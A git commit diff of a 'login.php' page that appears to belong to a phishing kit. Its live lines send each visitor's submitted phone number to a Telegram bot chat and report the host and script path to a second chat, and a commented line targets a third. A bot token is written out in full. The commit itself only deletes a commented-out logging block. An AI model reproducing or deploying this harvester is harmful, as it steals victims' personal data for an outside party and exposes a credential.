cbb6e52dd390b9d159f933e2e207f814a4e66991
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-11-11 21:12:42 +0700

    Update login.php

--- login.php
+++ login.php
@@ -1,12 +1,5 @@
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_POST['number']);
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001396771144&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
 
-/*
-// Comment if you want blank
-$num = $_POST['number'];
-$replyMsg = " Logged [ $ip ] \n Mobile Number: $num";
-*/
-
 // with them
 //file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-582319954&text=" . $_POST['number']);
-*
